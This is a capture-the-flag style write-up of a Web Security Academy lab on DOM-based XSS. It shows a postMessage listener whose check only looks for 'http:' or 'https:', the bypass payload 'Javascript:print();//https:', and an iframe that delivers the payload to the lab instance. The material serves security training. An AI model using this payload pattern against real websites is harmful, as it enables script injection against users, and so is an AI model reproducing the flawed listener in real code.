
### DOM XSS using web messages and a JavaScript URL : PRACTITIONER

---


> We are looking for any script that is misconfigured and contains a sink.
> Scanning through the website source code we see this script that deals with web messages.

```HTML
<script>
	window.addEventListener('message', function(e) {
	    var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
	        location.href = url;
        }
    }, false);
</script>
```

> What this does is that takes the message contents and checks for `http:` and `https:`.
> If either of them are found, then it redirects the window to the `url`, or the content of the message.

> Since this code only looks for the presence of either `http` or `https`, it just means we can place it anywhere in the message content, and have it not affect our XSS payload.
```javascript
Javascript:print();//https:
```

> To send a message, we can use an `iframe` that once loads, sends a message with the above payload.

```HTML
<iframe src="https://0a570049030c533485d3ba51009b0050.web-security-academy.net/" 
		onload="this.contentWindow.postMessage('Javascript:print();//https:','*')"
>
```

> Pasting this payload in the exploit server.

